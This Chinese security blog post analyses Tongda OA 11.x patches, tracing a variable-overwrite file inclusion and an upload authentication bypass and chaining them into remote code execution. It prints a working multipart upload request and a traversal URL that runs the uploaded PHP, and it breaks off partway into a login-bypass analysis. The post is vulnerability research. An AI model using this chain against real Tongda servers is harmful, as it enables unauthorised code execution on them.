> 原文链接: https://www.anquanke.com//post/id/210395 


# 从通达OA漏洞学习1day挖掘思路


                                阅读量   
                                **228079**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01eb4ee8be5bbcbb39.jpg)](https://p1.ssl.qhimg.com/t01eb4ee8be5bbcbb39.jpg)



## 0x0 前言

通达OA系统比较适合像我这种有点基础的菜鸡来学习1day漏洞挖掘思路，原因它自身源码会加密，也会发布漏洞补丁，漏洞利用性价值也很大，是主流的一个软件之一，所以无论是从任何角度来说，其漏洞成因和利用都是值得分析和研究的。



## 0x1 漏洞背景

搜索关于通达OA的漏洞公告可以确定,有3个影响比较严重的漏洞。

日期: 2020.03.13

任意文件上传 影响版本: &lt;=v11

任意文件包含,影响版本: =v11

[官方补丁](http://www.tongda2000.com/news/673.php)

日期: 2020.04.17

权限提升漏洞 危害级别: 严重 影响版本: &lt; 11.5.200417

[官方补丁](https://www.tongda2000.com/download/sp2019.php)

[![](https://p1.ssl.qhimg.com/t0142d28366f51e25cc.png)](https://p1.ssl.qhimg.com/t0142d28366f51e25cc.png)

通达OA版本的说明:

> <ul>
<li>通达OA产品每次发布修正合集时都会更新内部版本号，内部版本号共分为3部分：产品版本号、修正合集发布序号、更新日期。以11.1.191015为例：<br>
11表示此产品为11.0版<br>
1表示此版本包含11.0版发布后的第1次修正合集（序号为1）<br>
191015表示更新日期为2019年10月15日</li>
- 每次发布修正合集时会将版本号中第二部分（修正合集发布序号）加1，并更改更新日期，期间发布的增量升级包仅更改内部版本号中的更新日期部分。
</ul>



## 0x2 环境准备

解密代码: [SeayDzend.zip ](https://www.webshell.cc/?dl_id=19)

补丁分析工具: DiffMerge(dmg版本)

TDOA11.0 源码:[TDOA 11.3](https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe)

然后傻瓜化安装即可。



## 0x3 补丁差异分析

**这里简单介绍下，如何开展补丁差异分析的工作。**
1. 傻瓜化安装完之后，会存在一个`webroot`的加密源码目录,我们拷贝一份,另存为nopatchOA文件夹，然后运行对应的v11版本的补丁后，再拷贝一下patch之后的`webroot`文件夹另存在patchOA文件夹用来对比分析。1. 由于源码加密,这里我们需要用SeayDzend来进行解密出原生的PHP文件代码。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015909294a3df218b8.png)由于这个软件其实是写了个循环调用，文件比较多，速度还是比较慢的，这里我们可以同时进行两个文件夹的解密。<li>diffMerge 进行代码差异化对比分析[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://tva1.sinaimg.cn/large/007S8ZIlgy1ggktierezwj31aq0ru45z.jpg)可以发现更改了不少的文件,这里我们可以简单做一下排除法。
直接双击第一行，会弹出修改之后的差异
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bd011cd865b48002.png)
后面的话，我们一个一个文件去跟就行了，比如根据关键词”文件上传”,我们只找file文件相关的修改。
</li>


## 0x4 文件上传&amp;&amp;文件包含导致的RCE

### <a class="reference-link" name="0x4.1%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E6%9E%90"></a>0x4.1 文件包含分析

这里最容易找到的是文件包含的点(其他的点都没有直接的include、require等)

[![](https://p2.ssl.qhimg.com/t01ae9831a9f7dc62c6.png)](https://p2.ssl.qhimg.com/t01ae9831a9f7dc62c6.png)

`ispirit/interface/gateway.php`

通过对比分析:

```
if ($url != "") `{`
        if (substr($url, 0, 1) == "/") `{`
            $url = substr($url, 1);
        `}`

        if (strpos($url, "..") !== false) `{`
            echo _("ERROR URL");
            exit();
        `}`

        if ((strpos($url, "general/") === 0) || (strpos($url, "ispirit/") === 0) || (strpos($url, "module/") === 0)) `{`
            include_once $url;
        `}`
    `}`
```

发现通过strpos的方式去禁止了`..`的方式去跨目录。

然后接着限制了url中必须以这几个关键词:`general/` 、`ispirit/`、`module/`开头，也就是说限制了只能包含当前地址下的指定模块内容。(还是没有控制后缀,这个补法我不是很喜欢的,因为如果有其他漏洞可以穿越上传任意文件，也能利用这个文件上传点，一般这种洞修复可以考虑拼接个后缀`php`,限制只能包含php文件,不过这个可能是系统需要，没深究。)

接着我们需要看一下`$url`是否可控

```
if ($json) `{`
    $json = stripcslashes($json);
    $json = (array) json_decode($json);

    foreach ($json as $key =&gt; $val ) `{`
        if ($key == "data") `{`
            $val = (array) $val;

            foreach ($val as $keys =&gt; $value ) `{`
                $keys = $value;
            `}`
        `}`
    // 这里可以看到$json的key值为url时，其值便赋值给了$url
        if ($key == "url") `{`
            $url = $val;
        `}`
    `}`

    if ($url != "") `{`
        if (substr($url, 0, 1) == "/") `{`
            $url = substr($url, 1);
        `}`

        if (strpos($url, "..") !== false) `{`
            echo _("ERROR URL");
            exit();
        `}`
```

我们继续找找`$json`是否可控

结果发现当前文件,却并没有`$json`的获取方式。

这里由于我们没有通读整个cms，对通达的传参路由是没办法确定的。

这里我可以简单猜测传参方式:

> (1) 其他文件A通过包含这个文件，然后A中有`$json`这个参数的获取方式
(2) 因为这个文件头部有include,所以猜测本文件的开头include的文件会存在`$json`参数的获取。

下面我们可以逐一验证和排除，来确定`$json`是否直接可控。

通过cms的目录结构，我们可以知道`ispirit`OA精灵应该是属于一个独立的模块,通过在模块内

搜索`$json` 或者全局搜索`gateway`并没有发现，有其他文件包含了这个文件。

这里基本可以判定第二种的可能性更大，我们逐一分析这个文件包含进来的文件。

```
include_once "inc/session.php";
include_once "inc/conn.php";
include_once "inc/utility_org.php";
```

分析`inc/session.php` 这里直接略过function(因为没有调用),直接看可以执行的代码部分

[![](https://p4.ssl.qhimg.com/t017a5092e30810546c.png)](https://p4.ssl.qhimg.com/t017a5092e30810546c.png)

后面的代码主要是设置一些常量相关的内容，这次再次包含了`/inc/conn.php`,我们顺着分析下去。

`/inc/conn.php`的代码可执行部分又分别包含了以下两个文件

```
include_once "inc/td_config.php";
include_once "inc/utility.php";
```

这里我看到`utility.php`大概可以猜到这是一个工具函数文件，所以我先看了这个文件，发现里面果然是封装了比较多的function函数，代码的可执行部分，又重新`include_once "inc/td_config.php";`,所以我们只要重点分析这个文件即可。

[![](https://p4.ssl.qhimg.com/t01db865b92d1e37ce3.png)](https://p4.ssl.qhimg.com/t01db865b92d1e37ce3.png)

可以发现这个文件首先包含了`inc/common.inc.php`,然后定义了一堆的OA系统的一些配置变量,然后后面也包含了一个类文件，但是没有进行调用,那么我们接下来主要跟进下`common.inc.php`

提取可执行部分的代码

这里按道理来说，是不存在变量的覆盖的。

```
if (0 &lt; count($_COOKIE)) `{`
    foreach ($_COOKIE as $s_key =&gt; $s_value ) `{`
        if (!is_array($s_value)) `{`
            $_COOKIE[$s_key] = addslashes(strip_tags($s_value));
        `}`

        $s_key = $_COOKIE[$s_key];
    `}`

    reset($_COOKIE);
`}`

if (0 &lt; count($_POST)) `{`
    $arr_html_fields = array();

    foreach ($_POST as $s_key =&gt; $s_value ) `{`
        if (substr($s_key, 0, 7) == "_SERVER") `{`
            continue;
        `}`

        if (substr($s_key, 0, 15) != "TD_HTML_EDITOR_") `{`
            if (!is_array($s_value)) `{`
                $_POST[$s_key] = addslashes(strip_tags($s_value));
            `}`

            $s_key = $_POST[$s_key];
        `}`
        else `{`
            if (($s_key == "TD_HTML_EDITOR_FORM_HTML_DATA") || ($s_key == "TD_HTML_EDITOR_PRCS_IN") || ($s_key == "TD_HTML_EDITOR_PRCS_OUT") || ($s_key == "TD_HTML_EDITOR_QTPL_PRCS_SET") || (isset($_POST["ACTION_TYPE"]) &amp;&amp; (($_POST["ACTION_TYPE"] == "approve_center") || ($_POST["ACTION_TYPE"] == "workflow") || ($_POST["ACTION_TYPE"] == "sms") || ($_POST["ACTION_TYPE"] == "wiki")) &amp;&amp; (($s_key == "CONTENT") || ($s_key == "TD_HTML_EDITOR_CONTENT") || ($s_key == "TD_HTML_EDITOR_TPT_CONTENT")))) `{`
                unset($_POST[$s_key]);
                $s_key = ($s_key == "CONTENT" ? $s_key : substr($s_key, 15));
                $s_key = addslashes($s_value);
                $arr_html_fields[$s_key] = $s_key;
            `}`
            else `{`
                $encoding = mb_detect_encoding($s_value, "GBK,UTF-8");
                unset($_POST[$s_key]);
                $s_key = substr($s_key, 15);
                $s_key = addslashes(rich_text_clean($s_value, $encoding));
                $arr_html_fields[$s_key] = $s_key;
            `}`
        `}`
    `}`

    reset($_POST);
    $_POST = array_merge($_POST, $arr_html_fields);
`}`

if (0 &lt; count($_GET)) `{`
    foreach ($_GET as $s_key =&gt; $s_value ) `{`
        if (substr($s_key, 0, 7) == "_SERVER") `{`
            continue;
        `}`

        if (!is_array($s_value)) `{`
            $_GET[$s_key] = addslashes(strip_tags($s_value));
        `}`

        $s_key = $_GET[$s_key];
    `}`

    reset($_GET);
`}`

unset($s_key);
unset($s_value);
```

这里我以`$_GET`来分析一下:

```
if (0 &lt; count($_GET)) `{`
    foreach ($_GET as $s_key =&gt; $s_value ) `{`
        if (substr($s_key, 0, 7) == "_SERVER") `{`
            continue;
        `}`

        if (!is_array($s_value)) `{`
            $_GET[$s_key] = addslashes(strip_tags($s_value));
        `}`

        $s_key = $_GET[$s_key];
    `}`

    reset($_GET);
`}`
```

这里我就感觉很奇怪这段代码`$s_key = $_GET[$s_key];`作用,因为这样子就没啥用的，感觉很多余是吧，因为`$_key`会一直被覆盖，只能取最后第一个值，然后发现后面还有一个`unset($s_key)`,所以这段代码是多余的？,按道理来说我感觉这里应该是想写成变量覆盖那种形式的，比如`$$s_key = $_GET[$s_key];`,这样子的话,`$_GET`获取到的值都可以被注册成变量来调用，所以我当时怀疑是这个解密工具是不是解析错误了。

后面我专门拿`common.inc.php`,去了[php免费在线解密](http://dezend.qiling.org/free.html)

重新解密验证了我的猜想，修正的代码应该是这样。

```
if (0 &lt; count($_COOKIE)) `{`
    foreach ($_COOKIE as $s_key =&gt; $s_value) `{`
        if (!is_array($s_value)) `{`
            $_COOKIE[$s_key] = addslashes(strip_tags($s_value));
        `}`
        $`{`$s_key`}` = $_COOKIE[$s_key];
    `}`
    reset($_COOKIE);
`}`
if (0 &lt; count($_POST)) `{`
    $arr_html_fields = array();
    foreach ($_POST as $s_key =&gt; $s_value) `{`
        if (substr($s_key, 0, 7) == '_SERVER') `{`
            continue;
        `}`
        if (substr($s_key, 0, 15) != 'TD_HTML_EDITOR_') `{`
            if (!is_array($s_value)) `{`
                $_POST[$s_key] = addslashes(strip_tags($s_value));
            `}`
            $`{`$s_key`}` = $_POST[$s_key];
        `}` else `{`
            if ($s_key == 'TD_HTML_EDITOR_FORM_HTML_DATA' || $s_key == 'TD_HTML_EDITOR_PRCS_IN' || $s_key == 'TD_HTML_EDITOR_PRCS_OUT' || $s_key == 'TD_HTML_EDITOR_QTPL_PRCS_SET' || isset($_POST['ACTION_TYPE']) &amp;&amp; ($_POST['ACTION_TYPE'] == 'approve_center' || $_POST['ACTION_TYPE'] == 'workflow' || $_POST['ACTION_TYPE'] == 'sms' || $_POST['ACTION_TYPE'] == 'wiki') &amp;&amp; ($s_key == 'CONTENT' || $s_key == 'TD_HTML_EDITOR_CONTENT' || $s_key == 'TD_HTML_EDITOR_TPT_CONTENT')) `{`
                unset($_POST[$s_key]);
                $s_key = $s_key == 'CONTENT' ? $s_key : substr($s_key, 15);
                $`{`$s_key`}` = addslashes($s_value);
                $arr_html_fields[$s_key] = $`{`$s_key`}`;
            `}` else `{`
                $encoding = mb_detect_encoding($s_value, 'GBK,UTF-8');
                unset($_POST[$s_key]);
                $s_key = substr($s_key, 15);
                $`{`$s_key`}` = addslashes(rich_text_clean($s_value, $encoding));
                $arr_html_fields[$s_key] = $`{`$s_key`}`;
            `}`
        `}`
    `}`
    reset($_POST);
    $_POST = array_merge($_POST, $arr_html_fields);
`}`
if (0 &lt; count($_GET)) `{`
    foreach ($_GET as $s_key =&gt; $s_value) `{`
        if (substr($s_key, 0, 7) == '_SERVER') `{`
            continue;
        `}`
        if (!is_array($s_value)) `{`
            $_GET[$s_key] = addslashes(strip_tags($s_value));
        `}`
        $`{`$s_key`}` = $_GET[$s_key];
    `}`
    reset($_GET);
`}`
unset($s_key);
unset($s_value);
```

可以看到`$`{`$s_key`}` = $_GET[$s_key];`,这里就是很典型的二次变量覆盖漏洞,由于后面的`$json`变量也没有在下文进行了重新赋值操作，所以我们可以直接通过`$_GET $_POST`的方式进行该变量的赋值，从而在下文中控制文件包含的路径。

关于二次变量覆盖的原理，这里丢一张图，方便读者去理解。

![image-20200711113814108]([https://p1.ssl.qhimg.com/t01e79efb23227ae66a.png](https://p1.ssl.qhimg.com/t01e79efb23227ae66a.png)

**利用:**

[![](https://p2.ssl.qhimg.com/t016baf05159713128f.png)](https://p2.ssl.qhimg.com/t016baf05159713128f.png)

这里有个坑点，就是phpinfo好像用不了。

通过`var_dump(ini_get_all());`发现禁用了phpinfo,这个坑搞了我有点久,因为静态代码审计没办法通过调试来确定原因。

[![](https://p2.ssl.qhimg.com/t014b9df0b29e0a4257.png)](https://p2.ssl.qhimg.com/t014b9df0b29e0a4257.png)

### <a class="reference-link" name="0x4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90"></a>0x4.2 文件上传分析

通过文件差异对比分析，发现很多跟文件上传相关的文件，都只是修改了一个函数名

[![](https://p1.ssl.qhimg.com/t0105878421d876022f.png)](https://p1.ssl.qhimg.com/t0105878421d876022f.png)

封装了一个自己写的重命名函数。

不过我们继续看下来的话，还是可以发现里面有个文件(属于存在文件包含漏洞的模块)的改动是很不正常的。

`ispirit/im/upload.php`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012f8faf270e491040.png)

可以看到这里很明显是存在bug的，要不然不会这样子，先删掉else的部分，然后强制一定要包含`auth.php`

我们简单跟进下`auth.php`,看下这个文件的作用。

```
include_once "inc/session.php";
session_start();
session_write_close();
include_once "inc/conn.php";
include_once "inc/utility.php";
ob_start();
if (!isset($_SESSION["LOGIN_USER_ID"]) || ($_SESSION["LOGIN_USER_ID"] == "") || !isset($_SESSION["LOGIN_UID"]) || ($_SESSION["LOGIN_UID"] == "")) `{`
    sleep(1);
    if (!isset($_SESSION["LOGIN_USER_ID"]) || ($_SESSION["LOGIN_USER_ID"] == "") || !isset($_SESSION["LOGIN_UID"]) || ($_SESSION["LOGIN_UID"] == "")) `{`
        echo "-ERR " . _("用户未登陆");
        exit();
    `}`
`}`
```

发现这是一个鉴权的文件，通过`$_SESSION`来判断用户是否登录。

emmm…结合前面的修复代码。

```
$P = $_POST["P"];
if (isset($P) || ($P != "")) `{`
    ob_start();
    include_once "inc/session.php";
    session_id($P);
    session_start();
    session_write_close();
`}`
else `{`
    include_once "./auth.php";
`}`
```

可以看到`$P`这个值，是可以被控制不为空的，从而不加载鉴权文件，导致了绕过。

下面看一下怎么通过这个点来实现文件上传:

```
$TYPE = $_POST["TYPE"];
$DEST_UID = $_POST["DEST_UID"];
$dataBack = array();

if (($DEST_UID != "") &amp;&amp; !td_verify_ids($ids)) `{`
    $dataBack = array("status" =&gt; 0, "content" =&gt; "-ERR " . _("接收方ID无效"));
    echo json_encode(data2utf8($dataBack));
    exit();
`}`

if (strpos($DEST_UID, ",") !== false) `{`
`}`
else `{`
    $DEST_UID = intval($DEST_UID);
`}`

//$DEST_UID = 1
if ($DEST_UID == 0) `{`
    if ($UPLOAD_MODE != 2) `{`
        $dataBack = array("status" =&gt; 0, "content" =&gt; "-ERR " . _("接收方ID无效"));
        echo json_encode(data2utf8($dataBack));
        exit();
    `}`
`}`

$MODULE = "im";
```

```
function td_verify_ids($ids)
`{`
    return !preg_match("/[^0-9,]+/", $ids);
`}`
```

首先`td_verify_ids`默认返回true,后面通过控制`$DEST_UID`不等于0,即可绕过当前的判断。

```
if (1 &lt;= count($_FILES)) `{`
    if ($UPLOAD_MODE == "1") `{`
        if (strlen(urldecode($_FILES["ATTACHMENT"]["name"])) != strlen($_FILES["ATTACHMENT"]["name"])) `{`
            $_FILES["ATTACHMENT"]["name"] = urldecode($_FILES["ATTACHMENT"]["name"]);
        `}`
    `}`

    $ATTACHMENTS = upload("ATTACHMENT", $MODULE, false);

    if (!is_array($ATTACHMENTS)) `{`
        $dataBack = array("status" =&gt; 0, "content" =&gt; "-ERR " . $ATTACHMENTS);
        echo json_encode(data2utf8($dataBack));
        exit();
    `}`

    ob_end_clean();
    $ATTACHMENT_ID = substr($ATTACHMENTS["ID"], 0, -1);
    $ATTACHMENT_NAME = substr($ATTACHMENTS["NAME"], 0, -1);

    if ($TYPE == "mobile") `{`
        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), "utf-8", MYOA_CHARSET);
    `}`
`}`
else `{`
    $dataBack = array("status" =&gt; 0, "content" =&gt; "-ERR " . _("无文件上传"));
    echo json_encode(data2utf8($dataBack));
    exit();
`}`
```

可以进行了文件上传变量的获取，我们需要利用变量覆盖，控制`$UPLOAD_MODE=1`,然后进行一些urldecode文件名对比的操作，之后进入了`upload`函数,返回结果存储在`$ATTACHMENTS`这个变量之中。

```
$MODULE = "im";
$ATTACHMENTS = upload("ATTACHMENT", $MODULE, false);
```

跟进看一下这个函数的定义:

[![](https://p2.ssl.qhimg.com/t01ddbef60ac4c83a21.png)](https://p2.ssl.qhimg.com/t01ddbef60ac4c83a21.png)

```
function upload($PREFIX, $MODULE, $OUTPUT)
`{`
    if (strstr($MODULE, "/") || strstr($MODULE, "\")) `{`
        if (!$OUTPUT) `{`
            return _("参数含有非法字符。");
        `}`

        Message(_("错误"), _("参数含有非法字符。"));
        exit();
    `}`

    $ATTACHMENTS = array("ID" =&gt; "", "NAME" =&gt; "");
    reset($_FILES);


    foreach ($_FILES as $KEY =&gt; $ATTACHMENT ) `{`
        if (($ATTACHMENT["error"] == 4) || (($KEY != $PREFIX) &amp;&amp; (substr($KEY, 0, strlen($PREFIX) + 1) != $PREFIX . "_"))) `{`
            continue;
        `}`

        $data_charset = (isset($_GET["data_charset"]) ? $_GET["data_charset"] : (isset($_POST["data_charset"]) ? $_POST["data_charset"] : ""));
        $ATTACH_NAME = ($data_charset != "" ? td_iconv($ATTACHMENT["name"], $data_charset, MYOA_CHARSET) : $ATTACHMENT["name"]);
        $ATTACH_SIZE = $ATTACHMENT["size"];
        $ATTACH_ERROR = $ATTACHMENT["error"];
        $ATTACH_FILE = $ATTACHMENT["tmp_name"];
        $ERROR_DESC = "";

        if ($ATTACH_ERROR == UPLOAD_ERR_OK) `{`
            if (!is_uploadable($ATTACH_NAME)) `{`
                $ERROR_DESC = sprintf(_("禁止上传后缀名为[%s]的文件"), substr($ATTACH_NAME, strrpos($ATTACH_NAME, ".") + 1));
            `}`

            $encode = mb_detect_encoding($ATTACH_NAME, array("ASCII", "UTF-8", "GB2312", "GBK", "BIG5"));

            if ($encode != "UTF-8") `{`
                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, "utf-8", MYOA_CHARSET);
            `}`
            else `{`
                $ATTACH_NAME_UTF8 = $ATTACH_NAME;
            `}`

            if (preg_match("/[':&lt;&gt;?]|/|\\|"||/u", $ATTACH_NAME_UTF8)) `{`
                $ERROR_DESC = sprintf(_("文件名[%s]包含[/'":*?&lt;&gt;|]等非法字符"), $ATTACH_NAME);
            `}`

            if ($ATTACH_SIZE == 0) `{`
                $ERROR_DESC = sprintf(_("文件[%s]大小为0字节"), $ATTACH_NAME);
            `}`

            if ($ERROR_DESC == "") `{`
                $ATTACH_NAME = str_replace("'", "", $ATTACH_NAME);
                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);

                if ($ATTACH_ID === false) `{`
                    $ERROR_DESC = sprintf(_("文件[%s]上传失败"), $ATTACH_NAME);
                `}`
                else `{`
                    $ATTACHMENTS["ID"] .= $ATTACH_ID . ",";
                    $ATTACHMENTS["NAME"] .= $ATTACH_NAME . "*";
                `}`
            `}`

            @unlink($ATTACH_FILE);
        `}`
        else if ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) `{`
            $ERROR_DESC = sprintf(_("文件[%s]的大小超过了系统限制（%s）"), $ATTACH_NAME, ini_get("upload_max_filesize"));
        `}`
        else if ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) `{`
            $ERROR_DESC = sprintf(_("文件[%s]的大小超过了表单限制"), $ATTACH_NAME);
        `}`
        else if ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) `{`
            $ERROR_DESC = sprintf(_("文件[%s]上传不完整"), $ATTACH_NAME);
        `}`
        else if ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) `{`
            $ERROR_DESC = sprintf(_("文件[%s]上传失败：找不到临时文件夹"), $ATTACH_NAME);
        `}`
        else if ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) `{`
            $ERROR_DESC = sprintf(_("文件[%s]写入失败"), $ATTACH_NAME);
        `}`
        else `{`
            $ERROR_DESC = sprintf(_("未知错误[代码：%s]"), $ATTACH_ERROR);
        `}`

        if ($ERROR_DESC != "") `{`
            if (!$OUTPUT) `{`
                delete_attach($ATTACHMENTS["ID"], $ATTACHMENTS["NAME"], $MODULE);

                return $ERROR_DESC;
            `}`
            else `{`
                Message(_("错误"), $ERROR_DESC);
            `}`
        `}`
    `}`

    return $ATTACHMENTS;
`}`
```

在进行写入之前，进行了一系列关于后缀、文件名非法字符、文件大小的检查。

`if (!is_uploadable($ATTACH_NAME))` 跟进这个函数`is_uploadable`

```
function is_uploadable($FILE_NAME)
`{`
    $POS = strrpos($FILE_NAME, ".");

    if ($POS === false) `{`
    // 不存在. 的话，直接把文件名当后缀
        $EXT_NAME = $FILE_NAME;
    `}`
    else `{`
        if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == "php") `{`
      // 这里采用了黑名单的方式,.后3个字符必须为php则直接报错，
      return false;
        `}`

        $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));
    // 提取了最后一个. + 后面内容作为后缀
    `}`

    if (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) `{`
        return false;
    `}`
  //  $UPLOAD_FORBIDDEN_TYPE = "php,php3,php4,php5,phpt,jsp,asp,aspx,";
  //  这些也是限制的黑名单

    if (MYOA_UPLOAD_LIMIT == 0) `{`
        return true;
    `}`
    else if (MYOA_UPLOAD_LIMIT == 1) `{`
        return !find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);
    // $UPLOAD_LIMIT_TYPE = "php,php3,php4,php5,"; 
    `}`
    else if (MYOA_UPLOAD_LIMIT == 2) `{`
        return find_id(MYOA_UPLOAD_LIMIT_TYPE, $EXT_NAME);
    `}`
    else `{`
        return false;
    `}`
`}`
```

不过这里针对apache解析的话其实还是漏了一个phtml,不过当前环境是不解析phtml的。

然后`$ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);` 调用`add_attach`函数进行文件的写入。

```
$ATTACH_PARA_ARRAY = TD::get_cache("SYS_ATTACH_PARA");
    $ATTACH_PATH_ACTIVE = $ATTACH_PARA_ARRAY["SYS_ATTACH_PATH_ACTIVE"];
...
  $PATH = $ATTACH_PATH_ACTIVE . $MODULE;
    if (!file_exists($PATH) || !is_dir($PATH)) `{`
        @mkdir($PATH, 448);
    `}`

    $PATH = $PATH . "/" . $YM;
    if (!file_exists($PATH) || !is_dir($PATH)) `{`
        @mkdir($PATH, 448);
    `}`
...
  $FILENAME = $PATH . "/" . $ATTACH_ID . "." . $ATTACH_FILE;
    if (file_exists($FILENAME)) `{`
        $ATTACH_ID = mt_rand();
        $FILENAME = $PATH . "/" . $ATTACH_ID . "." . $ATTACH_FILE;
    `}`
...
      $ATTACH_ID_NEW = $AID . "@" . $YM . "_" . $ATTACH_ID;
    if (is_office($ATTACH_NAME) &amp;&amp; ($ATTACH_SIGN != 0)) `{`
        $ATTACH_ID_NEW .= "." . $ATTACH_SIGN;
    `}`

    return $ATTACH_ID_NEW;
```

其中`$PATH`的路径是在`inc/td_config.php`定义好的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0108863085dd287f10.png)

```
$ATTACH_PATH2 = realpath($ROOT_PATH . "../") . "/attach/";
 // 对应 /attach/im/
```

返回的内容信息对应的含义:

```
else if ($UPLOAD_MODE == "2") `{`
    $DURATION = intval($_POST["DURATION"]);
    $CONTENT = "[vm]" . $ATTACHMENT_ID . "|" . $ATTACHMENT_NAME . "|" . $DURATION . "[/vm]";
    $query = "INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES ('" . $_SESSION["LOGIN_UID"] . "', '" . $CONTENT . "', '" . time() . "')";
    $cursor = exequery(TD::conn(), $query);
    echo "+OK " . $CONTENT;
`}`
```

[![](https://p0.ssl.qhimg.com/t01be08ce949bb48856.png)](https://p0.ssl.qhimg.com/t01be08ce949bb48856.png)

poc:

```
POST /ispirit/im/upload.php HTTP/1.1
Host: 10.73.147.46:80
Content-Length: 494
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="P"


------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

&lt;?php
var_dump(md5(123));
?&gt;
------WebKitFormBoundaryBwVAwV3O4sifyhr3--

```

[![](https://p4.ssl.qhimg.com/t0142652b1b34f59472.png)](https://p4.ssl.qhimg.com/t0142652b1b34f59472.png)

[![](https://p0.ssl.qhimg.com/t017a387c8d2d6e39c0.png)](https://p0.ssl.qhimg.com/t017a387c8d2d6e39c0.png)

生成的地址: `/attach/im/2007/1859500039.jpg`(这个生成文件所在的目录并不是web目录，而是与web同级的)

### <a class="reference-link" name="0x4.3%20%E4%B8%A4%E8%80%85%E7%BB%93%E5%90%88RCE"></a>0x4.3 两者结合RCE

```
http://10.73.147.46/ispirit/interface/gateway.php?json=`{`"url":"ispirit/../../attach/im/2007/1859500039.jpg"`}`
```

[![](https://p4.ssl.qhimg.com/t01f5d22ad35f0491d0.png)](https://p4.ssl.qhimg.com/t01f5d22ad35f0491d0.png)



## 0x5 任意用户登录分析

### <a class="reference-link" name="0x5.1%20%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%83%8C%E6%99%AF"></a>0x5.1 漏洞的背景

这个洞主要是出现扫码登录的时候，关键`codeuid`参数外部泄露，从而可以被构造绕过登录。

### <a class="reference-link" name="0x5.2%20%E5%88%86%E6%9E%90%E5%8E%9F%E5%9B%A0"></a>0x5.2 分析原因

分析这个洞,可以根据上面第四节那样来分析，不过我打算，直接从文件入手(这样分析比前面难度会大一些，需要掌握整体的功能流程)。

首先确定了存在缺陷的文件名:根目录下`logincheck_code.php`

我发现我这个版本解密的结果跟网上好像不太一样。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014a780b58861cc8b3.png)

我这个系统好像根本没有校验`$CODEUID`的值(直接通过UID就可以设置相应的用户Session,一步到位)

后面我我手误点那个通达更新从11.3升级11.4的时候发现就已经校验了。

正好可以发现,主要多了个校验是:

```
